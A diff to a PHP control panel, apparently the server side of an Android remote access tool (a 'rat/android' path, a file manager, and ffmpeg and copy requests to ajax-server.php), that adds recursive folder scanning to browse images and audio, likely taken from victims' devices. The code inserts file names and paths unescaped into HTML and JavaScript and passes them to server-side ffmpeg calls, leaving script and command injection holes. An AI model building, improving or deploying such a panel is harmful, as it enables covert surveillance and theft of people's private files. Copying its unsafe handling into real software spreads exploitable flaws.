@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v1.6";
+$version = "v1.7";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -616,9 +616,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 
             if ($mime == "png" || $mime == "jpg" || $mime == "jpeg" || $mime == "gif") 
             {
-                $xpath = preg_replace('/\s+/', '\ ', $path);
-                $xgalfile = preg_replace('/\s+/', '\ ', $galfile); /* gila susah banget nyarinya*/
-
+               
                 $size = filesize($path.'/'.$galfile)/1024;
                 $size = round($size,3);
                 if($size >= 1024){
@@ -647,13 +645,15 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                         xhr.onreadystatechange = function() {
                             if (this.responseText !== "" && this.readyState == 4) 
                             {
+                                
                                 document.getElementById("'.$galfile.'").innerHTML = "";
                                 //var img = document.createElement("img");
+                                
                                 var img = document.getElementById("img"+this.responseText);
                                 var title = document.createElement("t");
                                 
                                 if (full == 1) {
-                                    img.src = "download.php?id=gambar:'.$xpath.'/"+this.responseText;
+                                    img.src = "download.php?id=gambar:'.$path.'/"+this.responseText;
                                     title.innerHTML = "<br><font color='."yellow".'>Name : "+this.responseText+"<br>Size: '.$size.'</font><br>"+
                                     "<a id=count"+this.responseText+" onclick=small(this.id)>"+this.responseText+"</a><br><br>";
                                 }
@@ -661,9 +661,9 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                                     img.src = "download.php?id=gambar:thumbs/"+this.responseText;
                                     //title.innerHTML = "<br><font color='."yellow".'>Name : "+this.responseText+"<br>Size: '.$size.'</font><br>"+
                                    // "<a id=count"+this.responseText+" onclick=full(this.id)>"+this.responseText+"</a><br><br>";
-                                    title.innerHTML = "<br><a target=_blank href=download.php?id=gambar:'.$xpath.'/"+this.responseText+">Full Image</a><br><br>";
+                                    title.innerHTML = "<br><a target=_blank href=download.php?id=gambar:'.$path.'/"+this.responseText+">Full Image</a><br><br>";
                                 }
-
+                                alert(""+this.responseText);
                                 document.getElementById(name).append(img, title);
                             }
                         };
@@ -678,7 +678,8 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                         var fname = document.getElementById(id).text;
                         procffmpeg('."'".$xpath."'".', fname, 1);
                     }
-                    procffmpeg('."'".$xpath."'".', '."'".$xgalfile."'".', 0);
+                    
+                    procffmpeg('."'".$path."'".', '."'".$galfile."'".', 0);
 
                 </script>';
 
@@ -744,35 +745,39 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                 }
             </style>';
 
-        foreach($galscandir as $galfile)
+        $files = dir_scan($path);
+        for ($i=0; $i<count($files); $i++) 
         {
-            $mime = strtolower(pathinfo($path.'/'.$galfile, PATHINFO_EXTENSION));
-
-            if ($mime == "m4a" || $mime == "wav" || $mime == "mp3") 
+            if (is_file($files[$i])) 
             {
-                $xpath = preg_replace('/\s+/', '\ ', $path);
-                $xgalfile = preg_replace('/\s+/', '\ ', $galfile);
+                $mime = strtolower(pathinfo($files[$i], PATHINFO_EXTENSION));
+                if ($mime == "mp3" || $mime == "wav" || $mime == "m4a" || $mime == "flac") 
+                {
+                    $size = filesize($files[$i])/1024;
+                    $size = round($size,3);
+                    if($size >= 1024){
+                        $size = round($size/1024,2).' MB';
+                    }else{
+                        $size = $size.' KB';
+                    }
+                    $galname = basename($files[$i]);
+                    $galpath = dirname($files[$i]);
 
-                $size = filesize($path.'/'.$galfile)/1024;
-                $size = round($size,3);
-                if($size >= 1024){
-                    $size = round($size/1024,2).' MB';
-                }else{
-                    $size = $size.' KB';
-                }
+                    echo '<div id="'.$galname.'"></div>';
+                    echo '<img id="img'.$galname.'"></img>';
 
-                echo '<div id="'.$galfile.'"></div>';
-                echo '<img id="img'.$galfile.'"></img>';
-
-                echo '
-                <script>
+                    echo '
+                    <script>
                     function procffmpeg(path, name, full)
                     {
                         var xhr = new XMLHttpRequest();
-                        var url = "ajax-server.php?idexl=ffmpeg:audio:"+path+":"+name;
+                        encpath = encodeURIComponent(path).replace("%20","+");
+                        encname = encodeURIComponent(name).replace("%20","+");
+
+                        var url = "ajax-server.php?idexl=ffmpeg:audio:"+encpath+":"+encname;
 
                         xhr.onloadstart = function () {
-                            document.getElementById("'.$galfile.'").innerHTML = "Loading...";
+                            document.getElementById("'.$galname.'").innerHTML = "Scanning...";
                         };
                         xhr.onerror = function () {
                             alert("Gagal mengambil data");
@@ -780,14 +785,22 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                         xhr.onreadystatechange = function() {
                             if (this.responseText !== "" && this.readyState == 4) 
                             {
-                                document.getElementById("'.$galfile.'").innerHTML = "";
-                                var img = document.getElementById("img"+this.responseText);
+                                var data = JSON.parse(this.responseText);
+                                var img = document.getElementById("img"+data.jname);
                                 var title = document.createElement("t");
-                                
-                                img.src = "download.php?id=gambar:thumbs/"+this.responseText+".jpg";
-                                title.innerHTML = "<br><font color='."yellow".'>Name : "+this.responseText+"<br>Size: '.$size.'</font><br>"+
-                                "<a id='.$xpath.'"+":"+this.responseText+" onclick=play(this.id)>Play</a><br><br>";
 
+                                title.innerHTML = "<br><font color='."yellow".'>Name : "+data.jname+"<br>Size: '.$size.'<br>Path: '.$galpath.'</font><br>"+
+                                "<a id="+data.jyyy+":"+data.jxxx+" onclick=play(this.id)>Play</a><br><br>";
+
+                                img.src = "download.php?id=gambar:thumbs/"+data.jname+".jpg";
+                                img.width = "320";
+                                img.height = "320";
+                                /*img.onload = function() {
+                                    img.width = this.width / 2;
+                                    img.height = this.height / 2;
+                                }*/
+                                
+                                document.getElementById("'.$galname.'").innerHTML = "";
                                 document.getElementById(name).append(img, title);
                             }
                         };
@@ -797,7 +810,8 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                     function play(name) {
                         //alert(name);
                         var xhr = new XMLHttpRequest();
-                        var url = "ajax-server.php?idexl=copy:"+name;
+                        var encname = encodeURIComponent(name).replace("%20","+");
+                        var url = "ajax-server.php?idexl=copy:"+encname;
 
                         xhr.onloadstart = function () {
                         };
@@ -822,9 +836,10 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                     function tes() {
                         alert("selesai");
                     }
-                    procffmpeg('."'".$xpath."'".', '."'".$xgalfile."'".', 0);
+                    procffmpeg('."'".$galpath."'".', '."'".$galname."'".', 0);
 
                 </script>';
+                }
             }
         }
     }
@@ -1349,6 +1364,15 @@ function path() {
         $dir = str_replace("\\", "/", getcwd());
     }
     return $dir;
+}
+function dir_scan($folder) {
+    $files = glob($folder);
+    foreach ($files as $f) {
+        if (is_dir($f)) {
+            $files = array_merge($files, dir_scan($f .'/*')); // scan subfolder
+        }
+    }
+    return $files;
 }
 
 function color($bold = 1, $colorid = null, $string = null) {
